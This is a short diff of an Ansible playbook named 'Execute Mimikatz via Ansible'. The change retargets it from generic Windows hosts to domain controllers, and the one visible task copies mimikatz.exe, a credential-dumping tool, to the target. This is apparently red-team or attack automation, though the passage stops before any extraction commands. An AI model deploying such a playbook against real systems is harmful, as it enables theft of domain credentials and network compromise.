@@ -1,6 +1,6 @@
 ---
 - name: Execute Mimikatz via Ansible
-  hosts: windows
+  hosts: domain-controllers
   gather_facts: yes
   tasks:
     - name: Copy mimikatz.exe to target
